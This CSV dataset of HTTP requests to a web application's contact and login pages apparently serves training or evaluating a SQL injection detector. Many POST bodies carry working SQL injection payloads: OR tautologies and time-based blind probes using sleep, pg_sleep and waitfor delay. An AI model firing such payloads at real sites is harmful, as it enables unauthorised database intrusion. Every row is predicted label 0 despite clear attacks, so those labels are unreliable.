,method,path,body,single_q,double_q,dashes,braces,spaces,badWords,type,prediction_label,prediction_score
224,POST,/contact,address=3137%20Laguna%20Street&firstName=1'%22&lastName=kklotbxs&message=20&subject=service,1,1,0,0,2,0,0,0,1.0
225,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
226,GET,/login,,0,0,0,0,0,4,0,0,1.0
227,GET,/,,0,0,0,0,0,6,0,0,1.0
228,GET,/static/,,0,0,0,0,0,4,0,0,1.0
229,POST,/contact,address=3137%20Laguna%20Street&firstName=%5c&lastName=kklotbxs&message=20&subject=service,0,0,0,0,2,0,0,0,0.9016
230,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
231,GET,/login,,0,0,0,0,0,4,0,0,1.0
232,GET,/,,0,0,0,0,0,18,0,0,1.0
233,GET,/static/,,0,0,0,0,0,4,0,0,1.0
234,POST,/contact,address=3137%20Laguna%20Street&firstName=1%00%c0%a7%c0%a2&lastName=kklotbxs&message=20&subject=service,0,0,0,0,2,0,0,0,0.9016
235,GET,/login,,0,0,0,0,0,2,0,0,1.0
236,GET,/,,0,0,0,0,0,4,0,0,1.0
237,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
238,GET,/static/,,0,0,0,0,0,4,0,0,1.0
239,POST,/contact,address=3137%20Laguna%20Street&firstName=%40%40hW4F6&lastName=kklotbxs&message=20&subject=service,0,0,0,0,2,0,0,0,0.9016
240,POST,/contact,address=-1%20OR%202%2b867-867-1%3d0%2b0%2b0%2b1%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=service,0,0,1,0,4,0,0,0,1.0
241,GET,/,,0,0,0,0,0,4,0,0,1.0
242,GET,/static/,,0,0,0,0,0,4,0,0,1.0
243,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
244,POST,/contact,address=3137%20Laguna%20Street&firstName=JyI%3d&lastName=kklotbxs&message=20&subject=service,0,0,0,0,2,0,0,0,0.9016
245,POST,/contact,address=-1%20OR%202%2b809-809-1%3d0%2b0%2b0%2b1&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=service,0,0,0,0,2,0,0,0,0.9016
246,GET,/,,0,0,0,0,0,4,0,0,1.0
247,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
248,GET,/static/,,0,0,0,0,0,4,0,0,1.0
249,POST,/contact,address=3137%20Laguna%20Street&firstName=%bf'%bf%22&lastName=kklotbxs&message=20&subject=service,1,1,0,0,2,0,0,0,1.0
250,POST,/contact,address=-1'%20OR%202%2b445-445-1%3d0%2b0%2b0%2b1%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=service,1,0,1,0,4,0,0,0,1.0
251,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
252,GET,/,,0,0,0,0,0,4,0,0,1.0
253,GET,/static/,,0,0,0,0,0,4,0,0,1.0
254,GET,/,,0,0,0,0,0,2,0,0,1.0
255,POST,/contact,address=3137%20Laguna%20Street&firstName=%f0''%f0%22%22&lastName=kklotbxs&message=20&subject=service,2,2,0,0,2,0,0,0,1.0
256,GET,/static/,,0,0,0,0,0,4,0,0,1.0
257,GET,/,,0,0,0,0,0,4,0,0,1.0
258,POST,/contact,address=-1'%20OR%202%2b109-109-1%3d0%2b0%2b0%2b1%20or%20'1f8CZsih'%3d'&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=service,4,0,0,0,4,0,0,0,1.0
259,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
260,POST,/contact,address=3137%20Laguna%20Street&firstName=(select%20convert(int%2cCHAR(65)))&lastName=kklotbxs&message=20&subject=service,0,0,0,3,3,1,0,0,1.0
261,GET,/static/img/,,0,0,0,0,0,2,0,0,1.0
262,GET,/static/,,0,0,0,0,0,4,0,0,1.0
263,GET,/static/,,0,0,0,0,0,2,0,0,1.0
264,POST,/contact,address=-1%22%20OR%202%2b951-951-1%3d0%2b0%2b0%2b1%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=service,0,1,1,0,4,0,0,0,1.0
265,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
266,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
267,POST,/contact,address=if(now()%3dsysdate()%2csleep(12)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(12)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(12)%2c0))OR%22*/&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=service,2,2,0,14,0,3,0,0,1.0
268,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
269,POST,/contact,address=3137%20Laguna%20Street&firstName=1'%22&lastName=kklotbxs&message=20&subject=suggestions,1,1,0,0,2,0,0,0,1.0
270,POST,/contact,address=(select(0)from(select(sleep(12)))v)/*'%2b(select(0)from(select(sleep(12)))v)%2b'%22%2b(select(0)from(select(sleep(12)))v)%2b%22*/&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=service,2,2,0,15,0,9,0,0,1.0
271,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
272,POST,/contact,address=3137%20Laguna%20Street&firstName=%5c&lastName=kklotbxs&message=20&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
273,POST,/contact,address=1%20waitfor%20delay%20'0:0:12'%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=service,2,0,1,0,5,2,0,0,1.0
274,GET,/login,,0,0,0,0,0,6,0,0,1.0
275,POST,/contact,address=3137%20Laguna%20Street&firstName=1%00%c0%a7%c0%a2&lastName=kklotbxs&message=20&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
276,GET,/login,,0,0,0,0,0,2,0,0,1.0
277,POST,/contact,address=yBu3GEs1';%20waitfor%20delay%20'0:0:4'%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=service,3,0,1,0,5,2,0,0,1.0
278,GET,/login,,0,0,0,0,0,18,0,0,1.0
279,POST,/contact,address=3137%20Laguna%20Street&firstName=%40%40kwlJ1&lastName=kklotbxs&message=20&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
280,POST,/contact,address=AC1P7qb5';select%20pg_sleep(4);%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=service,1,0,1,1,3,2,0,0,1.0
281,GET,/login,,0,0,0,0,0,4,0,0,1.0
282,POST,/contact,address=3137%20Laguna%20Street&firstName=JyI%3d&lastName=kklotbxs&message=20&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
283,POST,/contact,address=JJEIyZrV');select%20pg_sleep(4);%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=service,1,0,1,1,3,2,0,0,1.0
284,GET,/login,,0,0,0,0,0,4,0,0,1.0
285,POST,/contact,address=3137%20Laguna%20Street&firstName=%bf'%bf%22&lastName=kklotbxs&message=20&subject=suggestions,1,1,0,0,2,0,0,0,1.0
286,GET,/login,,0,0,0,0,0,4,0,0,1.0
287,POST,/contact,address=YFrXdlHx'));select%20pg_sleep(8);%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=service,1,0,1,1,3,2,0,0,1.0
288,GET,/,,0,0,0,0,0,2,0,0,1.0
289,POST,/contact,address=3137%20Laguna%20Street&firstName=%f0''%f0%22%22&lastName=kklotbxs&message=20&subject=suggestions,2,2,0,0,2,0,0,0,1.0
290,GET,/login,,0,0,0,0,0,4,0,0,1.0
291,GET,/,,0,0,0,0,0,6,0,0,1.0
292,POST,/contact,address=3137%20Laguna%20Street&firstName=(select%20convert(int%2cCHAR(65)))&lastName=kklotbxs&message=20&subject=suggestions,0,0,0,3,3,1,0,0,1.0
293,GET,/static/,,0,0,0,0,0,6,0,0,1.0
294,GET,/static/,,0,0,0,0,0,2,0,0,1.0
295,GET,/login,,0,0,0,0,0,4,0,0,1.0
296,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=product,0,0,0,0,2,0,0,0,0.9016
297,GET,/static/img/,,0,0,0,0,0,2,0,0,1.0
298,GET,/static/,,0,0,0,0,0,18,0,0,1.0
299,GET,/,,0,0,0,0,0,18,0,0,1.0
300,POST,/contact,address=3137%20Laguna%20Street&firstName=1'%22&lastName=kklotbxs&message=20&subject=product,1,1,0,0,2,0,0,0,1.0
301,GET,/static/,,0,0,0,0,0,4,0,0,1.0
302,POST,/contact,address=-1%20OR%202%2b482-482-1%3d0%2b0%2b0%2b1%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=suggestions,0,0,1,0,4,0,0,0,1.0
303,GET,/,,0,0,0,0,0,4,0,0,1.0
304,POST,/contact,address=3137%20Laguna%20Street&firstName=%5c&lastName=kklotbxs&message=20&subject=product,0,0,0,0,2,0,0,0,0.9016
305,GET,/static/,,0,0,0,0,0,4,0,0,1.0
306,POST,/contact,address=-1%20OR%202%2b722-722-1%3d0%2b0%2b0%2b1&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
307,POST,/contact,address=3137%20Laguna%20Street&firstName=1%00%c0%a7%c0%a2&lastName=kklotbxs&message=20&subject=product,0,0,0,0,2,0,0,0,0.9016
308,GET,/,,0,0,0,0,0,4,0,0,1.0
309,GET,/static/,,0,0,0,0,0,4,0,0,1.0
310,GET,/static/img/,,0,0,0,0,0,6,0,0,1.0
311,POST,/contact,address=-1'%20OR%202%2b845-845-1%3d0%2b0%2b0%2b1%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=suggestions,1,0,1,0,4,0,0,0,1.0
312,GET,/login,,0,0,0,0,0,2,0,0,1.0
313,POST,/contact,address=3137%20Laguna%20Street&firstName=%40%40uLi5g&lastName=kklotbxs&message=20&subject=product,0,0,0,0,2,0,0,0,0.9016
314,GET,/static/,,0,0,0,0,0,4,0,0,1.0
315,GET,/static/img/,,0,0,0,0,0,18,0,0,1.0
316,GET,/,,0,0,0,0,0,4,0,0,1.0
317,POST,/contact,address=-1'%20OR%202%2b134-134-1%3d0%2b0%2b0%2b1%20or%20'dUPPesv7'%3d'&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=suggestions,4,0,0,0,4,0,0,0,1.0
318,POST,/contact,address=3137%20Laguna%20Street&firstName=JyI%3d&lastName=kklotbxs&message=20&subject=product,0,0,0,0,2,0,0,0,0.9016
319,GET,/static/,,0,0,0,0,0,4,0,0,1.0
320,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
321,GET,/,,0,0,0,0,0,4,0,0,1.0
322,POST,/contact,address=-1%22%20OR%202%2b938-938-1%3d0%2b0%2b0%2b1%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=suggestions,0,1,1,0,4,0,0,0,1.0
323,POST,/contact,address=3137%20Laguna%20Street&firstName=%bf'%bf%22&lastName=kklotbxs&message=20&subject=product,1,1,0,0,2,0,0,0,1.0
324,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
325,GET,/,,0,0,0,0,0,4,0,0,1.0
326,POST,/contact,address=if(now()%3dsysdate()%2csleep(10)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(10)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(10)%2c0))OR%22*/&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=suggestions,2,2,0,14,0,3,0,0,1.0
327,POST,/contact,address=3137%20Laguna%20Street&firstName=%f0''%f0%22%22&lastName=kklotbxs&message=20&subject=product,2,2,0,0,2,0,0,0,1.0
328,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
329,GET,/,,0,0,0,0,0,4,0,0,1.0
330,POST,/contact,address=(select(0)from(select(sleep(15)))v)/*'%2b(select(0)from(select(sleep(15)))v)%2b'%22%2b(select(0)from(select(sleep(15)))v)%2b%22*/&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=suggestions,2,2,0,15,0,9,0,0,1.0
331,POST,/contact,address=3137%20Laguna%20Street&firstName=(select%20convert(int%2cCHAR(65)))&lastName=kklotbxs&message=20&subject=product,0,0,0,3,3,1,0,0,1.0
332,GET,/,,0,0,0,0,0,4,0,0,1.0
333,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
334,POST,/contact,address=1%20waitfor%20delay%20'0:0:15'%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=suggestions,2,0,1,0,5,2,0,0,1.0
335,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
336,GET,/static/img/,,0,0,0,0,0,2,0,0,1.0
337,GET,/,,0,0,0,0,0,4,0,0,1.0
338,POST,/contact,address=uFe03v72';%20waitfor%20delay%20'0:0:5'%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=suggestions,3,0,1,0,5,2,0,0,1.0
339,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=1'%22&message=20&subject=na,1,1,0,0,2,0,0,0,1.0
340,GET,/,,0,0,0,0,0,4,0,0,1.0
341,POST,/contact,address=409CiEaq';select%20pg_sleep(5);%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=suggestions,1,0,1,1,3,2,0,0,1.0
342,GET,/login,,0,0,0,0,0,6,0,0,1.0
343,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=%5c&message=20&subject=na,0,0,0,0,2,0,0,0,0.9016
344,GET,/,,0,0,0,0,0,4,0,0,1.0
345,POST,/contact,address=LBlnUJwv');select%20pg_sleep(10);%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=suggestions,1,0,1,1,3,2,0,0,1.0
346,GET,/,,0,0,0,0,0,2,0,0,1.0
347,GET,/login,,0,0,0,0,0,18,0,0,1.0
348,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=1%00%c0%a7%c0%a2&message=20&subject=na,0,0,0,0,2,0,0,0,0.9016
349,POST,/contact,address=nwO5ptRu'));select%20pg_sleep(10);%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=suggestions,1,0,1,1,3,2,0,0,1.0
350,GET,/login,,0,0,0,0,0,4,0,0,1.0
351,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=%40%40JIgHn&message=20&subject=na,0,0,0,0,2,0,0,0,0.9016
352,GET,/login,,0,0,0,0,0,4,0,0,1.0
353,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=JyI%3d&message=20&subject=na,0,0,0,0,2,0,0,0,0.9016
354,GET,/static/,,0,0,0,0,0,2,0,0,1.0
355,GET,/login,,0,0,0,0,0,2,0,0,1.0
356,GET,/login,,0,0,0,0,0,4,0,0,1.0
357,GET,/static/,,0,0,0,0,0,6,0,0,1.0
358,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=%bf'%bf%22&message=20&subject=na,1,1,0,0,2,0,0,0,1.0
359,GET,/login,,0,0,0,0,0,4,0,0,1.0
360,GET,/static/,,0,0,0,0,0,18,0,0,1.0
361,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=%f0''%f0%22%22&message=20&subject=na,2,2,0,0,2,0,0,0,1.0
362,POST,/contact,address=-1%20OR%202%2b300-300-1%3d0%2b0%2b0%2b1%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=product,0,0,1,0,4,0,0,0,1.0
363,GET,/login,,0,0,0,0,0,4,0,0,1.0
364,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=(select%20convert(int%2cCHAR(65)))&message=20&subject=na,0,0,0,3,3,1,0,0,1.0
365,GET,/static/,,0,0,0,0,0,4,0,0,1.0
366,GET,/login,,0,0,0,0,0,4,0,0,1.0
367,POST,/contact,address=-1%20OR%202%2b892-892-1%3d0%2b0%2b0%2b1&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=product,0,0,0,0,2,0,0,0,0.9016
368,GET,/static/,,0,0,0,0,0,4,0,0,1.0
369,GET,/static/img/,,0,0,0,0,0,2,0,0,1.0
370,GET,/static/img/,,0,0,0,0,0,6,0,0,1.0
371,POST,/contact,address=-1'%20OR%202%2b982-982-1%3d0%2b0%2b0%2b1%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=product,1,0,1,0,4,0,0,0,1.0
372,GET,/login,,0,0,0,0,0,4,0,0,1.0
373,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=1'%22&message=20&subject=service,1,1,0,0,2,0,0,0,1.0
374,GET,/static/,,0,0,0,0,0,4,0,0,1.0
375,GET,/static/img/,,0,0,0,0,0,18,0,0,1.0
376,POST,/contact,address=-1'%20OR%202%2b355-355-1%3d0%2b0%2b0%2b1%20or%20'NHWmvm7e'%3d'&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=product,4,0,0,0,4,0,0,0,1.0
377,GET,/login,,0,0,0,0,0,4,0,0,1.0
378,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=%5c&message=20&subject=service,0,0,0,0,2,0,0,0,0.9016
379,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
380,GET,/static/,,0,0,0,0,0,4,0,0,1.0
381,POST,/contact,address=-1%22%20OR%202%2b331-331-1%3d0%2b0%2b0%2b1%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=product,0,1,1,0,4,0,0,0,1.0
382,GET,/login,,0,0,0,0,0,4,0,0,1.0
383,GET,/,,0,0,0,0,0,6,0,0,1.0
384,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=1%00%c0%a7%c0%a2&message=20&subject=service,0,0,0,0,2,0,0,0,0.9016
385,GET,/,,0,0,0,0,0,2,0,0,1.0
386,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
387,GET,/static/,,0,0,0,0,0,4,0,0,1.0
388,POST,/contact,address=if(now()%3dsysdate()%2csleep(18)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(18)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(18)%2c0))OR%22*/&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=product,2,2,0,14,0,3,0,0,1.0
389,GET,/login,,0,0,0,0,0,4,0,0,1.0
390,GET,/,,0,0,0,0,0,18,0,0,1.0
391,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
392,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=%40%40G0I21&message=20&subject=service,0,0,0,0,2,0,0,0,0.9016
393,GET,/static/,,0,0,0,0,0,4,0,0,1.0
394,POST,/contact,address=(select(0)from(select(sleep(18)))v)/*'%2b(select(0)from(select(sleep(18)))v)%2b'%22%2b(select(0)from(select(sleep(18)))v)%2b%22*/&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=product,2,2,0,15,0,9,0,0,1.0
395,GET,/,,0,0,0,0,0,4,0,0,1.0
396,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=JyI%3d&message=20&subject=service,0,0,0,0,2,0,0,0,0.9016
397,GET,/static/,,0,0,0,0,0,4,0,0,1.0
398,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
399,POST,/contact,address=1%20waitfor%20delay%20'0:0:6'%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=product,2,0,1,0,5,2,0,0,1.0
400,GET,/login,,0,0,0,0,0,2,0,0,1.0
401,GET,/static/,,0,0,0,0,0,2,0,0,1.0
402,GET,/,,0,0,0,0,0,4,0,0,1.0
403,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=%bf'%bf%22&message=20&subject=service,1,1,0,0,2,0,0,0,1.0
404,GET,/static/,,0,0,0,0,0,4,0,0,1.0
405,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
406,POST,/contact,address=rXKVpWFZ';%20waitfor%20delay%20'0:0:12'%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=product,3,0,1,0,5,2,0,0,1.0
407,GET,/,,0,0,0,0,0,4,0,0,1.0
408,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=%f0''%f0%22%22&message=20&subject=service,2,2,0,0,2,0,0,0,1.0
409,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
410,GET,/static/,,0,0,0,0,0,4,0,0,1.0
411,POST,/contact,address=ubw9yDez';select%20pg_sleep(12);%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=product,1,0,1,1,3,2,0,0,1.0
412,GET,/,,0,0,0,0,0,4,0,0,1.0
413,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=(select%20convert(int%2cCHAR(65)))&message=20&subject=service,0,0,0,3,3,1,0,0,1.0
414,GET,/static/,,0,0,0,0,0,4,0,0,1.0
415,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
416,POST,/contact,address=sLt3mUDh');select%20pg_sleep(18);%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=product,1,0,1,1,3,2,0,0,1.0
417,GET,/,,0,0,0,0,0,4,0,0,1.0
418,GET,/static/img/,,0,0,0,0,0,2,0,0,1.0
419,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
420,POST,/contact,address=bI3XqDpt'));select%20pg_sleep(6);%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=product,1,0,1,1,3,2,0,0,1.0
421,GET,/,,0,0,0,0,0,4,0,0,1.0
422,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=1'%22&message=20&subject=suggestions,1,1,0,0,2,0,0,0,1.0
423,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
424,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,0,0,0,0,2,0,0,0,0.9016
425,GET,/,,0,0,0,0,0,4,0,0,1.0
426,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=%5c&message=20&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
427,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
428,GET,/,,0,0,0,0,0,4,0,0,1.0
429,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=1%00%c0%a7%c0%a2&message=20&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
430,GET,/,,0,0,0,0,0,2,0,0,1.0
431,POST,/contact,address=3137%20Laguna%20Street&firstName=T6ZQMq7K&lastName=pbwerxmf&message=20&subject=na,0,0,0,0,2,0,0,0,0.9016
432,GET,/,,0,0,0,0,0,4,0,0,1.0
433,GET,/login,,0,0,0,0,0,6,0,0,1.0
434,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=%40%40iTq5I&message=20&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
435,POST,/contact,address=3137%20Laguna%20Street&firstName=-1%20OR%202%2b926-926-1%3d0%2b0%2b0%2b1%20--%20&lastName=pbwerxmf&message=20&subject=na,0,0,1,0,6,0,0,0,1.0
436,GET,/,,0,0,0,0,0,4,0,0,1.0
437,GET,/login,,0,0,0,0,0,18,0,0,1.0
438,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=JyI%3d&message=20&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
439,POST,/contact,address=3137%20Laguna%20Street&firstName=-1%20OR%202%2b598-598-1%3d0%2b0%2b0%2b1&lastName=pbwerxmf&message=20&subject=na,0,0,0,0,4,0,0,0,1.0
440,GET,/login,,0,0,0,0,0,2,0,0,1.0
441,GET,/login,,0,0,0,0,0,4,0,0,1.0
442,GET,/static/,,0,0,0,0,0,2,0,0,1.0
443,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=%bf'%bf%22&message=20&subject=suggestions,1,1,0,0,2,0,0,0,1.0
444,GET,/login,,0,0,0,0,0,4,0,0,1.0
445,POST,/contact,address=3137%20Laguna%20Street&firstName=-1'%20OR%202%2b47-47-1%3d0%2b0%2b0%2b1%20--%20&lastName=pbwerxmf&message=20&subject=na,1,0,1,0,6,0,0,0,1.0
446,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=%f0''%f0%22%22&message=20&subject=suggestions,2,2,0,0,2,0,0,0,1.0
447,POST,/contact,address=3137%20Laguna%20Street&firstName=-1'%20OR%202%2b400-400-1%3d0%2b0%2b0%2b1%20or%20'h45QzybF'%3d'&lastName=pbwerxmf&message=20&subject=na,4,0,0,0,6,0,0,0,1.0
448,GET,/login,,0,0,0,0,0,4,0,0,1.0
449,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=(select%20convert(int%2cCHAR(65)))&message=20&subject=suggestions,0,0,0,3,3,1,0,0,1.0
450,GET,/static/,,0,0,0,0,0,6,0,0,1.0
451,POST,/contact,address=3137%20Laguna%20Street&firstName=-1%22%20OR%202%2b662-662-1%3d0%2b0%2b0%2b1%20--%20&lastName=pbwerxmf&message=20&subject=na,0,1,1,0,6,0,0,0,1.0
452,GET,/login,,0,0,0,0,0,4,0,0,1.0
453,GET,/static/,,0,0,0,0,0,18,0,0,1.0
454,GET,/static/img/,,0,0,0,0,0,2,0,0,1.0
455,POST,/contact,address=3137%20Laguna%20Street&firstName=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/&lastName=pbwerxmf&message=20&subject=na,2,2,0,14,2,3,0,0,1.0
456,GET,/login,,0,0,0,0,0,4,0,0,1.0
457,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=1'%22&message=20&subject=product,1,1,0,0,2,0,0,0,1.0
458,GET,/static/,,0,0,0,0,0,4,0,0,1.0
459,POST,/contact,address=3137%20Laguna%20Street&firstName=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/&lastName=pbwerxmf&message=20&subject=na,2,2,0,15,2,9,0,0,1.0
460,GET,/login,,0,0,0,0,0,4,0,0,1.0
461,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=%5c&message=20&subject=product,0,0,0,0,2,0,0,0,0.9016
462,GET,/static/,,0,0,0,0,0,4,0,0,1.0
463,GET,/static/img/,,0,0,0,0,0,6,0,0,1.0
464,POST,/contact,address=3137%20Laguna%20Street&firstName=1%20waitfor%20delay%20'0:0:3'%20--%20&lastName=pbwerxmf&message=20&subject=na,2,0,1,0,7,2,0,0,1.0
465,GET,/login,,0,0,0,0,0,4,0,0,1.0
466,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=1%00%c0%a7%c0%a2&message=20&subject=product,0,0,0,0,2,0,0,0,0.9016
467,GET,/static/img/,,0,0,0,0,0,18,0,0,1.0
468,GET,/,,0,0,0,0,0,2,0,0,1.0
469,GET,/static/,,0,0,0,0,0,4,0,0,1.0
470,POST,/contact,address=3137%20Laguna%20Street&firstName=5vBZQ2As';%20waitfor%20delay%20'0:0:6'%20--%20&lastName=pbwerxmf&message=20&subject=na,3,0,1,0,7,2,0,0,1.0
471,GET,/login,,0,0,0,0,0,4,0,0,1.0
472,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=%40%40skOvQ&message=20&subject=product,0,0,0,0,2,0,0,0,0.9016
473,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
474,GET,/static/,,0,0,0,0,0,4,0,0,1.0
